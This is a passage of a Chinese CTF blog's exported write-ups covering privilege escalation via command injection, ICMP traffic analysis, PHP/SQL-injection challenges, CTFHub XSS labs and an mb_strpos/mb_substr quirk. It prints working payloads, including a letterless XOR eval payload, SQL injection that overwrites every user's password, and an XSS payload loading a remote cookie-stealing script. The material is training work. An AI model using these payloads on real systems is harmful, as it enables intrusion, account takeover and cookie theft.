src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220505297.png" alt="image-20241130220505297"></p><blockquote><p>假的flag，binwalk看一下，发现有包含文件，直接foremost提取，得到另一张二维码</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220723797.png" alt="image-20241130220723797"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220739858.png" alt="image-20241130220739858"></p><blockquote><p>HUBUMARS{751da030-96b5-11ef-89a7-00155d84ef90}</p></blockquote><h4 id="Get-Root-or-Get-Lost">Get Root or Get Lost *</h4><blockquote><p>考点：提权</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207173433217.png" alt="image-20241207173433217"></p><blockquote><p>先按照提示连接。</p><p>提权，先试试 sudo -l</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207173550048.png" alt="image-20241207173550048"></p><blockquote><p>以sudo命令执行 /opt/game.py ，发现该文件不可读</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207173930648.png" alt="image-20241207173930648"></p><blockquote><p>但是在hubumars的家目录下有一个备份文件 game.bak</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207174004104.png" alt="image-20241207174004104"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import random</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def play_game():</span><br><span class="line">    choices = [&quot;石头&quot;, &quot;剪刀&quot;, &quot;布&quot;]</span><br><span class="line">    print(&quot;欢迎来到猜拳游戏！&quot;)</span><br><span class="line">    print(&quot;输入你的选择：&quot;)</span><br><span class="line">    print(&quot;1. 石头&quot;)</span><br><span class="line">    print(&quot;2. 剪刀&quot;)</span><br><span class="line">    print(&quot;3. 布&quot;)</span><br><span class="line">    print(&quot;输入 0 退出游戏&quot;)</span><br><span class="line"></span><br><span class="line">    player = input(&quot;请输入你的名字：&quot;)</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            # global user_choice</span><br><span class="line">            user_choice = int(input(&quot;你的选择：&quot;))</span><br><span class="line">            if user_choice == 0:</span><br><span class="line">                print(&quot;游戏结束！&quot;)</span><br><span class="line">                break</span><br><span class="line">            if user_choice not in [1, 2, 3]:</span><br><span class="line">                print(&quot;无效输入，请选择 1, 2, 3 或 0 退出游戏。&quot;)</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            user_move = choices[user_choice - 1]</span><br><span class="line">            computer_move = random.choice(choices)</span><br><span class="line"></span><br><span class="line">            print(f&quot;你选择了：&#123;user_move&#125;&quot;)</span><br><span class="line">            print(f&quot;电脑选择了：&#123;computer_move&#125;&quot;)</span><br><span class="line"></span><br><span class="line">            if user_move == computer_move:</span><br><span class="line">                print(&quot;平局！&quot;)</span><br><span class="line">            elif (</span><br><span class="line">                (user_move == &quot;石头&quot; and computer_move == &quot;剪刀&quot;)</span><br><span class="line">                or (user_move == &quot;剪刀&quot; and computer_move == &quot;布&quot;)</span><br><span class="line">                or (user_move == &quot;布&quot; and computer_move == &quot;石头&quot;)</span><br><span class="line">            ):</span><br><span class="line">                print(&quot;你赢了！载入史册&quot;)</span><br><span class="line">                winner = (</span><br><span class="line">                    &quot;echo 用户 【%s】 你战胜利计算机！载入史册 &gt;&gt; shice.txt &quot; % player</span><br><span class="line">                )</span><br><span class="line">                subprocess.Popen(winner, shell=True)</span><br><span class="line"></span><br><span class="line">            else:</span><br><span class="line">                print(&quot;你输了！&quot;)</span><br><span class="line"></span><br><span class="line">        except ValueError:</span><br><span class="line">            print(&quot;无效输入，请输入数字。&quot;)</span><br><span class="line">            user_choice = &quot;无效输入&quot;</span><br><span class="line">            message = &quot;echo 警报警报，检测%s 恶意输入 %s &gt;&gt; warning.txt &quot; % (</span><br><span class="line">                player,</span><br><span class="line">                user_choice,</span><br><span class="line">            )</span><br><span class="line">            print(message)</span><br><span class="line">            with open(&quot;warning.txt&quot;, &quot;a&quot;) as file:</span><br><span class="line">                process = subprocess.Popen(</span><br><span class="line">                    [&quot;echo&quot;, message], stdout=file  # 将标准输出重定向到文件</span><br><span class="line">                )</span><br><span class="line">                process.communicate()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    play_game()</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>分析看到这段代码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">winner = (</span><br><span class="line">                    &quot;echo 用户 【%s】 你战胜利计算机！载入史册 &gt;&gt; shice.txt &quot; % player</span><br><span class="line">                )</span><br><span class="line">                subprocess.Popen(winner, shell=True)</span><br></pre></td></tr></table></figure><blockquote><p>发现会执行winner里面的命令，所以只要将用户名设置成可执行函数，就可以执行。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207174332055.png" alt="image-20241207174332055"></p><blockquote><p>如上图，whoami被执行了，所以我们这次执行找flag.php的命令</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;find / -name &quot;*flag*&quot; 2&gt;/dev/null;</span><br></pre></td></tr></table></figure><blockquote><p>然后读取root目录下的flag即可</p></blockquote><h4 id="隐秘的流量">隐秘的流量</h4><blockquote><p>考点：流量分析，ICMP协议</p></blockquote><blockquote><p>用wireshake打开，统计-&gt; 分级协议</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207175808812.png" alt="image-20241207175808812"></p><blockquote><p>发现有UDP,TCP,ICMP协议</p><p>重点关注ICMP协议。</p><p>WireShark 过滤条件 icmp &amp; icmp.type = 8 【含义：icmp协议，类型8代</p><p>表发送请求，参考：ICMP报文的格式和种类-腾讯云开发者社区-腾讯云)</p><p>注意到后面都有几个特殊的字符，提取出来</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207175917648.png" alt="image-20241207175917648"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 使用tshark 提取</span><br><span class="line">└─🍀 tshark -r secret.pcapng -Y &#x27;icmp &amp;&amp; icmp.type = 8&#x27; -T fields -e &quot;data.data&quot; | xxd -p -r | base32 -d | base64 -d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">命令解释：</span><br><span class="line">-r : 读取文件，后面跟流量包文件名</span><br><span class="line">-Y : 过滤的条件，这里是icmp的方法请求的流量包</span><br><span class="line">-T :设置输出格式，如json，fields等</span><br><span class="line">-e : 输出特定的字段</span><br><span class="line">xxd -p -r ：将十六进制转化为字符串</span><br><span class="line"></span><br><span class="line">windows如果安装了wireshake，则在其目录下有个tshark.exe程序。</span><br></pre></td></tr></table></figure><blockquote><p>HUBUMARS{1CMp_da7a_15_1n73R3571N9}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HUBUCTF-2022-新生赛-wp</title>
      <link href="/posts/1f67230d.html"/>
      <url>/posts/1f67230d.html</url>
      
        <content type="html"><![CDATA[<h2 id="checkin">checkin</h2><blockquote><p>考点：反序列化，弱比较，php</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$username  = &quot;this_is_secret&quot;; </span><br><span class="line">$password  = &quot;this_is_not_known_to_you&quot;; </span><br><span class="line">include(&quot;flag.php&quot;);//here I changed those two </span><br><span class="line">$info = isset($_GET[&#x27;info&#x27;])? $_GET[&#x27;info&#x27;]: &quot;&quot; ;</span><br><span class="line">$data_unserialize = unserialize($info);</span><br><span class="line">if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;username or password error!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码审计，只需要传入的info的username和password值与变量的值弱比较。</p><p>这里很容易想到相等（强比较），但是其实是弱比较，而且根据提示可以知道这两个变量的值会改变，所以我们不知道确切的值，直接构造赋值0和1，最后发现0和0成功了，所以这两个变量改变了后还是字符串</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129191723974.png" alt="image-20241129191723974"></p><blockquote><p>NSSCTF{29cf034a-9052-4aec-b776-b1c8b18b82f5}</p></blockquote><h2 id="HowToGetShell">HowToGetShell</h2><blockquote><p>考点：无字母rce，php</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$mess=$_POST[&#x27;mess&#x27;];</span><br><span class="line">if(preg_match(&quot;/[a-zA-Z]/&quot;,$mess))&#123;</span><br><span class="line">    die(&quot;invalid input!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">eval($mess);</span><br></pre></td></tr></table></figure><p>过滤了所有字母，但有字母，可以使用异或绕过。脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">valid = &quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot; #可以用的符号</span><br><span class="line">answer = &quot;phpinfo&quot;  #要构造的命令</span><br><span class="line">tmp1,tmp2 = &#x27;&#x27;,&#x27;&#x27;</span><br><span class="line">for c in answer:</span><br><span class="line">    for i in valid:</span><br><span class="line">        for j in valid:</span><br><span class="line">            if (ord(i)^ord(j) == ord(c)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line">        break</span><br><span class="line">print(tmp1,tmp2)</span><br><span class="line">//0302181 @[@[_^^ ，所以传入&quot;0302181&quot;^&quot;@[@[_^^&quot;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mess=$_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_();</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129203748374.png" alt="image-20241129203748374"></p><blockquote><p>NSSCTF{3290ae33-f255-4d6b-9bba-2b1be6ddd485}</p></blockquote><h2 id="Calculate">Calculate</h2><blockquote><p>考点：python,web,脚本编写</p></blockquote><p>直接上脚本吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 假设这是我们要与之交互的网站的URL</span><br><span class="line">url = &#x27;http://node5.anna.nssctf.cn:28984/&#x27;  # 请替换为实际的URL</span><br><span class="line"></span><br><span class="line"># 创建一个会话来保持cookie和其他会话信息</span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"># 正则表达式模式来匹配数字或运算符，它们被&lt;div&gt;标签包围</span><br><span class="line">pattern = re.compile(r&#x27;&lt;div[^&gt;]*?&gt;([0-9+\-*\/=]+)&lt;/div&gt;&#x27;)</span><br><span class="line"></span><br><span class="line"># 循环直到我们找到包含关键词&quot;ctf&quot;的页面</span><br><span class="line">for i in range(20):</span><br><span class="line">    # 发送GET请求来获取当前页面</span><br><span class="line">    response = session.get(url)</span><br><span class="line">    html_content = response.text</span><br><span class="line">    </span><br><span class="line">    # 使用BeautifulSoup解析HTML内容</span><br><span class="line">    soup = BeautifulSoup(html_content, &#x27;html.parser&#x27;)</span><br><span class="line">    </span><br><span class="line">    # 查找所有包含数字或运算符的&lt;div&gt;标签</span><br><span class="line">    divs = soup.find_all(&#x27;div&#x27;, text=re.compile(r&#x27;[0-9+\-*\/=]&#x27;))</span><br><span class="line">    </span><br><span class="line">    # 使用正则表达式从标签中提取数字或运算符</span><br><span class="line">    tokens = pattern.findall(str(divs))</span><br><span class="line">    </span><br><span class="line">    # 拼接成一个数学表达式（注意：这里假设表达式是简单的，没有括号）</span><br><span class="line">    # 我们需要去除任何多余的空格和可能的=符号（它可能是表达式的一部分或用于提示用户输入）</span><br><span class="line">    # 并且我们假设=符号后面不会紧跟数字或运算符（即它是表达式的结尾）</span><br><span class="line">    expression_parts = [token for token in tokens if token != &#x27;=&#x27;]</span><br><span class="line">    expression = &#x27;&#x27;.join(expression_parts).replace(&#x27; &#x27;, &#x27;&#x27;)</span><br><span class="line">    print(expression)</span><br><span class="line">    # 计算表达式的值（注意：这里使用eval有安全风险，但在本例中为了简化而使用）</span><br><span class="line">    try:</span><br><span class="line">        result = eval(expression)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Error evaluating expression &#x27;&#123;expression&#125;&#x27;: &#123;e&#125;&quot;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">    # 为了避免过快地发送请求，我们添加了一个短暂的延迟（至少1秒）</span><br><span class="line">    # 根据题目要求，我们不能在1秒内回答一个问题，所以这里使用0.5秒的延迟</span><br><span class="line">    time.sleep(1.1)</span><br><span class="line">    # 准备POST数据</span><br><span class="line">    post_data = &#123;&#x27;ans&#x27;: result&#125;</span><br><span class="line">    print(result)</span><br><span class="line">    # 发送POST请求将答案发送回服务器</span><br><span class="line">    post_response = session.post(url, data=post_data)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    # 检查响应内容是否包含关键词&quot;ctf&quot;</span><br><span class="line">print(post_response.text)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"># 关闭会话</span><br><span class="line">session.close()</span><br></pre></td></tr></table></figure><blockquote><p>NSSCTF{32a5eadd-b078-4e0c-9570-1b2852476085}</p></blockquote><h2 id="ezsql">ezsql</h2><blockquote><p>考点：sql注入</p></blockquote><p>先扫一下目录，发现源码，审计源码，发现sql注入</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231234785.png" alt="image-20241129231234785"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231223286.png" alt="image-20241129231223286"></p><p>根据提示，存在sql注入，直接sqlmap扫</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129230333540.png" alt="image-20241129230333540"></p><p>发现在年龄处存在sql注入漏洞，且根据payload可以看出是数字型注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">修改当前表所有nickname为444</span><br><span class="line">nickname=aa&amp;age=11,nickname=444%23&amp;description=111&amp;token=</span><br><span class="line">修改当前表所有password为123</span><br><span class="line">nickname=aa&amp;age=11,password=0x3230326362393632616335393037356239363462303731353264323334623730%23&amp;description=111&amp;token=</span><br><span class="line">#0x3230326362393632616335393037356239363462303731353264323334623730=hex(md5(‘123’))</span><br><span class="line">#urlencode(#)=%23</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231014113.png" alt="image-20241129231014113"></p><blockquote><p>NSSCTF{3a6a5fad-87c3-4a7a-a6b6-35f1a532b42e}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHub技能树-XSS</title>
      <link href="/posts/57dd66d8.html"/>
      <url>/posts/57dd66d8.html</url>
      
        <content type="html"><![CDATA[<h2 id="反射型">反射型</h2><p>打开网站</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9bb879732317d8055c0970fba4a32d29.png" alt="img"></p><p>反射型，直接使用xss平台，将生成的地址传入第一个空</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>然后将url代码传入第二个空就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191309973.png" alt="image-20241128191309973"></p><p>flag=ctfhub{a51bb55f89d068a011466d62}</p><h2 id="存储型">存储型</h2><p>打开网站，依然像上面的步骤一样。</p><p>区别于前面反射型xss的是，他建立恶意连接是在于每一次都要发送含恶意代码，而这个存储xss不需要，一旦发送过一次，以后每次访问它时，都会含有恶意代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215208090.png" alt="image-20241128215208090"></p><blockquote><p>flag=ctfhub{1cef0cbbc0bb33244d4a5c76}</p></blockquote><h2 id="DOM反射">DOM反射</h2><p>查看源码位置</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215659407.png" alt="image-20241128215659407"></p><p>需要闭合前面的 ’  ，所以只需要在xss注入时前面加上’; ，然后把后面的’;注释掉。</p><p>由于前面没有东西了，所以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script src= &gt;</span><br></pre></td></tr></table></figure><p>其余步骤一样</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128220249060.png" alt="image-20241128220249060"></p><blockquote><p>flag=ctfhub{aebf8f6244f0ad340612cc6e}</p></blockquote><h2 id="过滤空格">过滤空格</h2><p>步骤一样，空格可以用[/]或者/**/代替</p><blockquote><p>flag=ctfhub{9830f9e82cfbc1e77a1d0dae}</p></blockquote><h2 id="过滤关键词">过滤关键词</h2><p>先用探针试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230131380.png" alt="image-20241128230131380"></p><p>发现没有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script</span><br></pre></td></tr></table></figure><p>所以是过滤了关键字script，可以使用大小写绕过，用sCRiPt</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230522782.png" alt="image-20241128230522782"></p><blockquote><p>flag=ctfhub{9f0740745ba9e7b754658614}</p></blockquote><h2 id="DOM跳转">DOM跳转</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8cc2801a3c464c193d00baffc33e1cf5.png" alt="img"></p><p>分析一下，代码意思是 从当前页面的URL中获取查询字符串（URL的get参数），如果参数名为&quot;jumpto&quot;，则将页面重定向到参数值所指定的URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        var target = location.search.split(&quot;=&quot;)</span><br><span class="line">  //以等号分割成两份，一份是参数名，另一份是参数的值（可利用）</span><br><span class="line">        if (target[0].slice(1) == &quot;jumpto&quot;) &#123;</span><br><span class="line">  //其中target[0].slice(1)是指去掉?后面的参数名</span><br><span class="line">            location.href = target[1];</span><br><span class="line">  //如果参数名相等，就location.href（表示页面跳转）到target[1]，也就是参数的值</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以利用js代码和 jQuery 的 $.getScript() 函数来异步加载并执行来自 xss平台 的 js 脚本，使用前提是网站引用了jQuery。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0a827819b269477f8353e9ab693fd778.png" alt="img"></p><p>这里构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-c644076cd9fc7c0b.sandbox.ctfhub.com:10800/?jumpto=javascript:$.getScript(&quot;//xsscom.com//He7bc3&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5d1f1a7369a1089bdaf85bfe5d4c2e11.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/81d580917fb146dbd354c87ab6ee6e49.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS在线平台使用</title>
      <link href="/posts/169f5f8e.html"/>
      <url>/posts/169f5f8e.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：由于自己搭建的xss平台需要服务器才能获取其他网络的cookie，所以无法接收赛题的cookie，最简便的方法还是使用在线平台，虽然可能有一定风险，以后买服务器了再搭建自己的吧</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191835876.png" alt="image-20241128191835876"></p><p>登录后，直接创建项目就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191919585.png" alt="image-20241128191919585"></p><p>传入的地址如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>然后就能在平台上接受到了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128192046521.png" alt="image-20241128192046521"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mb_strpos与mb_substr错位索引</title>
      <link href="/posts/c81521cb.html"/>
      <url>/posts/c81521cb.html</url>
      
        <content type="html"><![CDATA[<h2 id="mb-strpos与mb-substr错位索引">mb_strpos与mb_substr错位索引</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">2. mb_substr和mb_strpos函数漏洞</span><br><span class="line">mb_strpos() 和 mb_substr() 是 PHP 中用于处理多字节字符的函数，专门用于处理 UTF-8 或其他多字节编码的字符串。</span><br><span class="line">(1)mb_strpos: 用于查找一个字符串在另一个字符串中第一次出现的位置（索引），返回结果是该子字符串第一次出现的位置（索引）。</span><br><span class="line">mb_strpos(string $haystack, string $needle, int $offset = 0, string $encoding = null): int|false</span><br><span class="line">    $haystack：要在其中搜索子字符串的源字符串。</span><br><span class="line">    $needle：要搜索的子字符串。</span><br><span class="line">    $offset（可选）：从哪个位置开始搜索，默认为 0。</span><br><span class="line">    $encoding（可选）：要使用的字符编码，默认为内部字符编码。</span><br><span class="line"></span><br><span class="line">(2)mb_substr: 用于获取一个字符串的子串，返回结果是指定位置和长度的子字符串。</span><br><span class="line">mb_substr(string $string, int $start, int $length = null, string $encoding = null): string|false</span><br><span class="line">    $string：要截取的原始字符串。</span><br><span class="line">    $start：截取的起始位置。如果是负数，则表示从末尾开始计数。</span><br><span class="line">    $length（可选）：要截取的长度。如果未指定，则默认截取至字符串的末尾。</span><br><span class="line">    $encoding（可选）：要使用的字符编码，默认为内部字符编码。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">当以 \xF0 开头的字节序列出现在 UTF-8 编码中时，通常表示一个四字节的 Unicode 字符。这是因为 UTF-8 编码规范定义了以 \xF0 开头的字节序列用于编码较大的 Unicode 字符。</span><br><span class="line">不符合4位的规则的话，mb_substr和mb_strpos执行存在差异：</span><br><span class="line">(1)mb_strpos遇到\xF0时，会把无效字节先前的字节视为一个字符，然后从无效字节重新开始解析</span><br><span class="line">mb_strpos(&quot;\xf0\x9fAAA&lt;BB&quot;, &#x27;&lt;&#x27;); #返回4 \xf0\x9f视作是一个字节，从A开始变为无效字节 #A为\x41  上述字符串其认为是7个字节</span><br><span class="line"></span><br><span class="line">(2)mb_substr遇到\xF0时，会把无效字节当做四字节Unicode字符的一部分，然后继续解析</span><br><span class="line">mb_substr(&quot;\xf0\x9fAAA&lt;BB&quot;, 0, 4); #&quot;\xf0\x9fAAA&lt;B&quot; \xf0\x9fAA视作一个字符 上述字符串其认为是5个字节</span><br><span class="line"></span><br><span class="line">结论：mb_strpos相对于mb_substr来说，可以把索引值向后移动</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">3. mb_substr和mb_strpos函数漏洞与本题结合</span><br><span class="line">通过控制C的长度可以控制我们想要执行$key的长度</span><br><span class="line">通过控制B我们可以控制索引值需要提前几位</span><br><span 